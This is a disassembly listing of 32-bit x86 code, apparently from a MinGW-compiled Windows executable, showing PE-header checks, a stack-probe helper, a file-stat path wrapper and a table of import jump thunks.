  40a3f6:	f6 42 27 20          	testb  $0x20,0x27(%edx)
  40a3fa:	74 07                	je     0x40a403
  40a3fc:	85 db                	test   %ebx,%ebx
  40a3fe:	74 14                	je     0x40a414
  40a400:	83 eb 01             	sub    $0x1,%ebx
  40a403:	83 c0 01             	add    $0x1,%eax
  40a406:	83 c2 28             	add    $0x28,%edx
  40a409:	39 c8                	cmp    %ecx,%eax
  40a40b:	72 e9                	jb     0x40a3f6
  40a40d:	31 f6                	xor    %esi,%esi
  40a40f:	89 f0                	mov    %esi,%eax
  40a411:	5b                   	pop    %ebx
  40a412:	5e                   	pop    %esi
  40a413:	c3                   	ret
  40a414:	89 d6                	mov    %edx,%esi
  40a416:	89 f0                	mov    %esi,%eax
  40a418:	5b                   	pop    %ebx
  40a419:	5e                   	pop    %esi
  40a41a:	c3                   	ret
  40a41b:	90                   	nop
  40a41c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a420:	53                   	push   %ebx
  40a421:	31 db                	xor    %ebx,%ebx
  40a423:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a42a:	4d 5a 
  40a42c:	74 04                	je     0x40a432
  40a42e:	89 d8                	mov    %ebx,%eax
  40a430:	5b                   	pop    %ebx
  40a431:	c3                   	ret
  40a432:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a437:	e8 d4 fd ff ff       	call   0x40a210
  40a43c:	85 c0                	test   %eax,%eax
  40a43e:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a443:	0f 45 d8             	cmovne %eax,%ebx
  40a446:	89 d8                	mov    %ebx,%eax
  40a448:	5b                   	pop    %ebx
  40a449:	c3                   	ret
  40a44a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a450:	31 c0                	xor    %eax,%eax
  40a452:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a459:	4d 5a 
  40a45b:	74 03                	je     0x40a460
  40a45d:	c3                   	ret
  40a45e:	66 90                	xchg   %ax,%ax
  40a460:	83 ec 08             	sub    $0x8,%esp
  40a463:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a468:	e8 a3 fd ff ff       	call   0x40a210
  40a46d:	85 c0                	test   %eax,%eax
  40a46f:	74 25                	je     0x40a496
  40a471:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40a475:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a47c:	2d 00 00 40 00       	sub    $0x400000,%eax
  40a481:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a485:	e8 c6 fd ff ff       	call   0x40a250
  40a48a:	85 c0                	test   %eax,%eax
  40a48c:	74 12                	je     0x40a4a0
  40a48e:	8b 40 24             	mov    0x24(%eax),%eax
  40a491:	f7 d0                	not    %eax
  40a493:	c1 e8 1f             	shr    $0x1f,%eax
  40a496:	83 c4 08             	add    $0x8,%esp
  40a499:	c3                   	ret
  40a49a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a4a0:	31 c0                	xor    %eax,%eax
  40a4a2:	eb f2                	jmp    0x40a496
  40a4a4:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a4aa:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  40a4b0:	57                   	push   %edi
  40a4b1:	31 ff                	xor    %edi,%edi
  40a4b3:	56                   	push   %esi
  40a4b4:	53                   	push   %ebx
  40a4b5:	83 ec 08             	sub    $0x8,%esp
  40a4b8:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a4bf:	4d 5a 
  40a4c1:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40a4c5:	74 09                	je     0x40a4d0
  40a4c7:	83 c4 08             	add    $0x8,%esp
  40a4ca:	89 f8                	mov    %edi,%eax
  40a4cc:	5b                   	pop    %ebx
  40a4cd:	5e                   	pop    %esi
  40a4ce:	5f                   	pop    %edi
  40a4cf:	c3                   	ret
  40a4d0:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a4d5:	e8 36 fd ff ff       	call   0x40a210
  40a4da:	85 c0                	test   %eax,%eax
  40a4dc:	74 e9                	je     0x40a4c7
  40a4de:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a4e3:	8b b0 80 00 40 00    	mov    0x400080(%eax),%esi
  40a4e9:	85 f6                	test   %esi,%esi
  40a4eb:	74 da                	je     0x40a4c7
  40a4ed:	89 74 24 04          	mov    %esi,0x4(%esp)
  40a4f1:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a4f8:	e8 53 fd ff ff       	call   0x40a250
  40a4fd:	85 c0                	test   %eax,%eax
  40a4ff:	74 c6                	je     0x40a4c7
  40a501:	81 c6 00 00 40 00    	add    $0x400000,%esi
  40a507:	89 f2                	mov    %esi,%edx
  40a509:	75 0b                	jne    0x40a516
  40a50b:	eb ba                	jmp    0x40a4c7
  40a50d:	8d 76 00             	lea    0x0(%esi),%esi
  40a510:	83 eb 01             	sub    $0x1,%ebx
  40a513:	83 c2 14             	add    $0x14,%edx
  40a516:	8b 4a 04             	mov    0x4(%edx),%ecx
  40a519:	85 c9                	test   %ecx,%ecx
  40a51b:	75 07                	jne    0x40a524
  40a51d:	8b 42 0c             	mov    0xc(%edx),%eax
  40a520:	85 c0                	test   %eax,%eax
  40a522:	74 1c                	je     0x40a540
  40a524:	85 db                	test   %ebx,%ebx
  40a526:	7f e8                	jg     0x40a510
  40a528:	8b 7a 0c             	mov    0xc(%edx),%edi
  40a52b:	83 c4 08             	add    $0x8,%esp
  40a52e:	5b                   	pop    %ebx
  40a52f:	5e                   	pop    %esi
  40a530:	81 c7 00 00 40 00    	add    $0x400000,%edi
  40a536:	89 f8                	mov    %edi,%eax
  40a538:	5f                   	pop    %edi
  40a539:	c3                   	ret
  40a53a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a540:	83 c4 08             	add    $0x8,%esp
  40a543:	31 ff                	xor    %edi,%edi
  40a545:	89 f8                	mov    %edi,%eax
  40a547:	5b                   	pop    %ebx
  40a548:	5e                   	pop    %esi
  40a549:	5f                   	pop    %edi
  40a54a:	c3                   	ret
  40a54b:	90                   	nop
  40a54c:	90                   	nop
  40a54d:	90                   	nop
  40a54e:	90                   	nop
  40a54f:	90                   	nop
  40a550:	51                   	push   %ecx
  40a551:	50                   	push   %eax
  40a552:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a557:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40a55b:	72 15                	jb     0x40a572
  40a55d:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40a563:	83 09 00             	orl    $0x0,(%ecx)
  40a566:	2d 00 10 00 00       	sub    $0x1000,%eax
  40a56b:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a570:	77 eb                	ja     0x40a55d
  40a572:	29 c1                	sub    %eax,%ecx
  40a574:	83 09 00             	orl    $0x0,(%ecx)
  40a577:	58                   	pop    %eax
  40a578:	59                   	pop    %ecx
  40a579:	c3                   	ret
  40a57a:	90                   	nop
  40a57b:	90                   	nop
  40a57c:	66 90                	xchg   %ax,%ax
  40a57e:	66 90                	xchg   %ax,%ax
  40a580:	e9 bb 03 00 00       	jmp    0x40a940
  40a585:	90                   	nop
  40a586:	90                   	nop
  40a587:	90                   	nop
  40a588:	90                   	nop
  40a589:	90                   	nop
  40a58a:	90                   	nop
  40a58b:	90                   	nop
  40a58c:	90                   	nop
  40a58d:	90                   	nop
  40a58e:	90                   	nop
  40a58f:	90                   	nop
  40a590:	55                   	push   %ebp
  40a591:	57                   	push   %edi
  40a592:	56                   	push   %esi
  40a593:	53                   	push   %ebx
  40a594:	83 ec 4c             	sub    $0x4c,%esp
  40a597:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  40a59b:	8b 7c 24 64          	mov    0x64(%esp),%edi
  40a59f:	85 db                	test   %ebx,%ebx
  40a5a1:	74 07                	je     0x40a5aa
  40a5a3:	0f b6 13             	movzbl (%ebx),%edx
  40a5a6:	84 d2                	test   %dl,%dl
  40a5a8:	75 66                	jne    0x40a610
  40a5aa:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40a5ae:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a5b2:	89 1c 24             	mov    %ebx,(%esp)
  40a5b5:	e8 8e 03 00 00       	call   0x40a948
  40a5ba:	89 c6                	mov    %eax,%esi
  40a5bc:	83 fe ff             	cmp    $0xffffffff,%esi
  40a5bf:	0f 84 6b 01 00 00    	je     0x40a730
  40a5c5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40a5c9:	89 07                	mov    %eax,(%edi)
  40a5cb:	8b 44 24 20          	mov    0x20(%esp),%eax
  40a5cf:	89 47 04             	mov    %eax,0x4(%edi)
  40a5d2:	8b 44 24 24          	mov    0x24(%esp),%eax
  40a5d6:	89 47 08             	mov    %eax,0x8(%edi)
  40a5d9:	8b 44 24 28          	mov    0x28(%esp),%eax
  40a5dd:	89 47 0c             	mov    %eax,0xc(%edi)
  40a5e0:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40a5e4:	89 47 10             	mov    %eax,0x10(%edi)
  40a5e7:	8b 44 24 30          	mov    0x30(%esp),%eax
  40a5eb:	89 47 14             	mov    %eax,0x14(%edi)
  40a5ee:	8b 44 24 34          	mov    0x34(%esp),%eax
  40a5f2:	89 47 18             	mov    %eax,0x18(%edi)
  40a5f5:	8b 44 24 38          	mov    0x38(%esp),%eax
  40a5f9:	89 47 1c             	mov    %eax,0x1c(%edi)
  40a5fc:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40a600:	89 47 20             	mov    %eax,0x20(%edi)
  40a603:	89 f0                	mov    %esi,%eax
  40a605:	83 c4 4c             	add    $0x4c,%esp
  40a608:	5b                   	pop    %ebx
  40a609:	5e                   	pop    %esi
  40a60a:	5f                   	pop    %edi
  40a60b:	5d                   	pop    %ebp
  40a60c:	c3                   	ret
  40a60d:	8d 76 00             	lea    0x0(%esi),%esi
  40a610:	89 1c 24             	mov    %ebx,(%esp)
  40a613:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40a617:	e8 1c 02 00 00       	call   0x40a838
  40a61c:	83 f8 01             	cmp    $0x1,%eax
  40a61f:	89 c6                	mov    %eax,%esi
  40a621:	7e 87                	jle    0x40a5aa
  40a623:	8d 40 fe             	lea    -0x2(%eax),%eax
  40a626:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40a62a:	83 f8 01             	cmp    $0x1,%eax
  40a62d:	0f 86 d2 00 00 00    	jbe    0x40a705
  40a633:	80 fa 2f             	cmp    $0x2f,%dl
  40a636:	74 05                	je     0x40a63d
  40a638:	80 fa 5c             	cmp    $0x5c,%dl
  40a63b:	75 0c                	jne    0x40a649
  40a63d:	0f b6 43 01          	movzbl 0x1(%ebx),%eax
  40a641:	3c 2f                	cmp    $0x2f,%al
  40a643:	74 5e                	je     0x40a6a3
  40a645:	3c 5c                	cmp    $0x5c,%al
  40a647:	74 5a                	je     0x40a6a3
  40a649:	0f b6 44 33 ff       	movzbl -0x1(%ebx,%esi,1),%eax
  40a64e:	3c 5c                	cmp    $0x5c,%al
  40a650:	74 08                	je     0x40a65a
  40a652:	3c 2f                	cmp    $0x2f,%al
  40a654:	0f 85 50 ff ff ff    	jne    0x40a5aa
  40a65a:	89 34 24             	mov    %esi,(%esp)
  40a65d:	e8 5e 01 00 00       	call   0x40a7c0
  40a662:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40a666:	89 c5                	mov    %eax,%ebp
  40a668:	8d 46 ff             	lea    -0x1(%esi),%eax
  40a66b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40a66f:	89 2c 24             	mov    %ebp,(%esp)
  40a672:	e8 51 01 00 00       	call   0x40a7c8
  40a677:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40a67b:	c6 44 35 ff 00       	movb   $0x0,-0x1(%ebp,%esi,1)
  40a680:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a684:	89 2c 24             	mov    %ebp,(%esp)
  40a687:	e8 bc 02 00 00       	call   0x40a948
  40a68c:	39 eb                	cmp    %ebp,%ebx
  40a68e:	89 c6                	mov    %eax,%esi
  40a690:	0f 84 26 ff ff ff    	je     0x40a5bc
  40a696:	89 2c 24             	mov    %ebp,(%esp)
  40a699:	e8 6a 01 00 00       	call   0x40a808
  40a69e:	e9 19 ff ff ff       	jmp    0x40a5bc
  40a6a3:	0f b6 4b 02          	movzbl 0x2(%ebx),%ecx
  40a6a7:	8d 53 02             	lea    0x2(%ebx),%edx
  40a6aa:	80 f9 5c             	cmp    $0x5c,%cl
  40a6ad:	75 12                	jne    0x40a6c1
  40a6af:	eb 14                	jmp    0x40a6c5
  40a6b1:	80 f9 2f             	cmp    $0x2f,%cl
  40a6b4:	74 5f                	je     0x40a715
  40a6b6:	83 c2 01             	add    $0x1,%edx
  40a6b9:	0f b6 0a             	movzbl (%edx),%ecx
  40a6bc:	80 f9 5c             	cmp    $0x5c,%cl
  40a6bf:	74 04                	je     0x40a6c5
  40a6c1:	84 c9                	test   %cl,%cl
  40a6c3:	75 ec                	jne    0x40a6b1
  40a6c5:	84 c9                	test   %cl,%cl
  40a6c7:	75 4c                	jne    0x40a715
  40a6c9:	0f b6 02             	movzbl (%edx),%eax
  40a6cc:	84 c0                	test   %al,%al
  40a6ce:	66 90                	xchg   %ax,%ax
  40a6d0:	0f 84 d4 fe ff ff    	je     0x40a5aa
  40a6d6:	3c 5c                	cmp    $0x5c,%al
  40a6d8:	75 14                	jne    0x40a6ee
  40a6da:	eb 16                	jmp    0x40a6f2
  40a6dc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a6e0:	83 c2 01             	add    $0x1,%edx
  40a6e3:	0f b6 02             	movzbl (%edx),%eax
  40a6e6:	3c 5c                	cmp    $0x5c,%al
  40a6e8:	74 36                	je     0x40a720
  40a6ea:	84 c0                	test   %al,%al
  40a6ec:	74 32                	je     0x40a720
  40a6ee:	3c 2f                	cmp    $0x2f,%al
  40a6f0:	75 ee                	jne    0x40a6e0
  40a6f2:	80 7a 01 00          	cmpb   $0x0,0x1(%edx)
  40a6f6:	0f 85 4d ff ff ff    	jne    0x40a649
  40a6fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a700:	e9 a5 fe ff ff       	jmp    0x40a5aa
  40a705:	80 7b 01 3a          	cmpb   $0x3a,0x1(%ebx)
  40a709:	0f 85 24 ff ff ff    	jne    0x40a633
  40a70f:	90                   	nop
  40a710:	e9 95 fe ff ff       	jmp    0x40a5aa
  40a715:	83 c2 01             	add    $0x1,%edx
  40a718:	eb af                	jmp    0x40a6c9
  40a71a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a720:	84 c0                	test   %al,%al
  40a722:	0f 84 82 fe ff ff    	je     0x40a5aa
  40a728:	eb c8                	jmp    0x40a6f2
  40a72a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a730:	f7 c7 01 00 00 00    	test   $0x1,%edi
  40a736:	ba 24 00 00 00       	mov    $0x24,%edx
  40a73b:	75 3f                	jne    0x40a77c
  40a73d:	f7 c7 02 00 00 00    	test   $0x2,%edi
  40a743:	75 29                	jne    0x40a76e
  40a745:	89 d1                	mov    %edx,%ecx
  40a747:	31 c0                	xor    %eax,%eax
  40a749:	c1 e9 02             	shr    $0x2,%ecx
  40a74c:	f6 c2 02             	test   $0x2,%dl
  40a74f:	f3 ab                	rep stos %eax,%es:(%edi)
  40a751:	74 09                	je     0x40a75c
  40a753:	31 c0                	xor    %eax,%eax
  40a755:	83 c7 02             	add    $0x2,%edi
  40a758:	66 89 47 fe          	mov    %ax,-0x2(%edi)
  40a75c:	83 e2 01             	and    $0x1,%edx
  40a75f:	74 03                	je     0x40a764
  40a761:	c6 07 00             	movb   $0x0,(%edi)
  40a764:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a769:	e9 97 fe ff ff       	jmp    0x40a605
  40a76e:	31 c9                	xor    %ecx,%ecx
  40a770:	83 c7 02             	add    $0x2,%edi
  40a773:	66 89 4f fe          	mov    %cx,-0x2(%edi)
  40a777:	83 ea 02             	sub    $0x2,%edx
  40a77a:	eb c9                	jmp    0x40a745
  40a77c:	c6 07 00             	movb   $0x0,(%edi)
  40a77f:	b2 23                	mov    $0x23,%dl
  40a781:	83 c7 01             	add    $0x1,%edi
  40a784:	eb b7                	jmp    0x40a73d
  40a786:	90                   	nop
  40a787:	90                   	nop
  40a788:	90                   	nop
  40a789:	90                   	nop
  40a78a:	90                   	nop
  40a78b:	90                   	nop
  40a78c:	90                   	nop
  40a78d:	90                   	nop
  40a78e:	90                   	nop
  40a78f:	90                   	nop
  40a790:	ff 25 ac e2 41 00    	jmp    *0x41e2ac
  40a796:	90                   	nop
  40a797:	90                   	nop
  40a798:	ff 25 b8 e2 41 00    	jmp    *0x41e2b8
  40a79e:	90                   	nop
  40a79f:	90                   	nop
  40a7a0:	a1 64 d6 41 00       	mov    0x41d664,%eax
  40a7a5:	c3                   	ret
  40a7a6:	8d 76 00             	lea    0x0(%esi),%esi
  40a7a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a7b0:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a7b4:	87 05 64 d6 41 00    	xchg   %eax,0x41d664
  40a7ba:	c3                   	ret
  40a7bb:	90                   	nop
  40a7bc:	90                   	nop
  40a7bd:	90                   	nop
  40a7be:	90                   	nop
  40a7bf:	90                   	nop
  40a7c0:	ff 25 60 e3 41 00    	jmp    *0x41e360
  40a7c6:	90                   	nop
  40a7c7:	90                   	nop
  40a7c8:	ff 25 68 e3 41 00    	jmp    *0x41e368
  40a7ce:	90                   	nop
  40a7cf:	90                   	nop
  40a7d0:	ff 25 c4 e2 41 00    	jmp    *0x41e2c4
  40a7d6:	90                   	nop
  40a7d7:	90                   	nop
  40a7d8:	ff 25 c0 e2 41 00    	jmp    *0x41e2c0
  40a7de:	90                   	nop
  40a7df:	90                   	nop
  40a7e0:	ff 25 e4 e2 41 00    	jmp    *0x41e2e4
  40a7e6:	90                   	nop
  40a7e7:	90                   	nop
  40a7e8:	ff 25 30 e3 41 00    	jmp    *0x41e330
  40a7ee:	90                   	nop
  40a7ef:	90                   	nop
  40a7f0:	ff 25 50 e3 41 00    	jmp    *0x41e350
  40a7f6:	90                   	nop
  40a7f7:	90                   	nop
  40a7f8:	ff 25 48 e3 41 00    	jmp    *0x41e348
  40a7fe:	90                   	nop
  40a7ff:	90                   	nop
  40a800:	ff 25 34 e3 41 00    	jmp    *0x41e334
  40a806:	90                   	nop
  40a807:	90                   	nop
  40a808:	ff 25 4c e3 41 00    	jmp    *0x41e34c
  40a80e:	90                   	nop
  40a80f:	90                   	nop
  40a810:	ff 25 58 e3 41 00    	jmp    *0x41e358
  40a816:	90                   	nop
  40a817:	90                   	nop
  40a818:	ff 25 54 e3 41 00    	jmp    *0x41e354
  40a81e:	90                   	nop
  40a81f:	90                   	nop
  40a820:	ff 25 3c e3 41 00    	jmp    *0x41e33c
  40a826:	90                   	nop
  40a827:	90                   	nop
  40a828:	ff 25 90 e3 41 00    	jmp    *0x41e390
  40a82e:	90                   	nop
  40a82f:	90                   	nop
  40a830:	ff 25 84 e3 41 00    	jmp    *0x41e384
  40a836:	90                   	nop
  40a837:	90                   	nop
  40a838:	ff 25 94 e3 41 00    	jmp    *0x41e394
  40a83e:	90                   	nop
  40a83f:	90                   	nop
  40a840:	ff 25 9c e3 41 00    	jmp    *0x41e39c
  40a846:	90                   	nop
  40a847:	90                   	nop
  40a848:	ff 25 ac e3 41 00    	jmp    *0x41e3ac
  40a84e:	90                   	nop
  40a84f:	90                   	nop
  40a850:	ff 25 a8 e3 41 00    	jmp    *0x41e3a8
  40a856:	90                   	nop
  40a857:	90                   	nop
  40a858:	ff 25 8c e3 41 00    	jmp    *0x41e38c
  40a85e:	90                   	nop
  40a85f:	90                   	nop
  40a860:	ff 25 28 e3 41 00    	jmp    *0x41e328
  40a866:	90                   	nop
  40a867:	90                   	nop
  40a868:	ff 25 a0 e3 41 00    	jmp    *0x41e3a0
  40a86e:	90                   	nop
  40a86f:	90                   	nop
  40a870:	ff 25 a4 e3 41 00    	jmp    *0x41e3a4
  40a876:	90                   	nop
  40a877:	90                   	nop
  40a878:	ff 25 98 e3 41 00    	jmp    *0x41e398
  40a87e:	90                   	nop
  40a87f:	90                   	nop
  40a880:	ff 25 6c e3 41 00    	jmp    *0x41e36c
  40a886:	90                   	nop
  40a887:	90                   	nop
  40a888:	ff 25 5c e3 41 00    	jmp    *0x41e35c
  40a88e:	90                   	nop
  40a88f:	90                   	nop
  40a890:	ff 25 88 e3 41 00    	jmp    *0x41e388
  40a896:	90                   	nop
  40a897:	90                   	nop
  40a898:	ff 25 d0 e2 41 00    	jmp    *0x41e2d0
  40a89e:	90                   	nop
  40a89f:	90                   	nop
  40a8a0:	ff 25 40 e3 41 00    	jmp    *0x41e340
  40a8a6:	90                   	nop
  40a8a7:	90                   	nop
  40a8a8:	ff 25 74 e3 41 00    	jmp    *0x41e374
  40a8ae:	90                   	nop
  40a8af:	90                   	nop
  40a8b0:	ff 25 64 e3 41 00    	jmp    *0x41e364
  40a8b6:	90                   	nop
  40a8b7:	90                   	nop
  40a8b8:	ff 25 80 e3 41 00    	jmp    *0x41e380
  40a8be:	90                   	nop
  40a8bf:	90                   	nop
  40a8c0:	ff 25 78 e3 41 00    	jmp    *0x41e378
  40a8c6:	90                   	nop
  40a8c7:	90                   	nop
  40a8c8:	ff 25 08 e3 41 00    	jmp    *0x41e308
  40a8ce:	90                   	nop
  40a8cf:	90                   	nop
  40a8d0:	ff 25 70 e3 41 00    	jmp    *0x41e370
  40a8d6:	90                   	nop
  40a8d7:	90                   	nop
  40a8d8:	ff 25 f0 e2 41 00    	jmp    *0x41e2f0
  40a8de:	90                   	nop
  40a8df:	90                   	nop
  40a8e0:	ff 25 f4 e2 41 00    	jmp    *0x41e2f4
  40a8e6:	90                   	nop
  40a8e7:	90                   	nop
  40a8e8:	ff 25 fc e2 41 00    	jmp    *0x41e2fc
  40a8ee:	90                   	nop
  40a8ef:	90                   	nop
  40a8f0:	ff 25 38 e3 41 00    	jmp    *0x41e338
  40a8f6:	90                   	nop
  40a8f7:	90                   	nop
  40a8f8:	ff 25 2c e3 41 00    	jmp    *0x41e32c
  40a8fe:	90                   	nop
  40a8ff:	90                   	nop
  40a900:	ff 25 7c e3 41 00    	jmp    *0x41e37c
  40a906:	90                   	nop
  40a907:	90                   	nop
  40a908:	ff 25 b0 e3 41 00    	jmp    *0x41e3b0
  40a90e:	90                   	nop
  40a90f:	90                   	nop
  40a910:	ff 25 ec e2 41 00    	jmp    *0x41e2ec
  40a916:	90                   	nop
  40a917:	90                   	nop
  40a918:	ff 25 a4 e2 41 00    	jmp    *0x41e2a4
  40a91e:	90                   	nop
  40a91f:	90                   	nop
  40a920:	ff 25 10 e3 41 00    	jmp    *0x41e310
  40a926:	90                   	nop
  40a927:	90                   	nop
  40a928:	ff 25 b0 e2 41 00    	jmp    *0x41e2b0
  40a92e:	90                   	nop
  40a92f:	90                   	nop
  40a930:	ff 25 44 e3 41 00    	jmp    *0x41e344
  40a936:	90                   	nop
  40a937:	90                   	nop
  40a938:	ff 25 24 e3 41 00    	jmp    *0x41e324
  40a93e:	90                   	nop
  40a93f:	90                   	nop
  40a940:	ff 25 14 e3 41 00    	jmp    *0x41e314
  40a946:	90                   	nop
  40a947:	90                   	nop
  40a948:	ff 25 04 e3 41 00    	jmp    *0x41e304
  40a94e:	90                   	nop
  40a94f:	90                   	nop
  40a950:	ff                   	(bad)
  40a951:	ff                   	(bad)
  40a952:	ff                   	(bad)
  40a953:	ff 00                	incl   (%eax)
  40a955:	00 00                	add    %al,(%eax)
  40a957:	00 ff                	add    %bh,%bh
  40a959:	ff                   	(bad)
  40a95a:	ff                   	(bad)
  40a95b:	ff 00                	incl   (%eax)
  40a95d:	00 00                	add    %al,(%eax)
	...
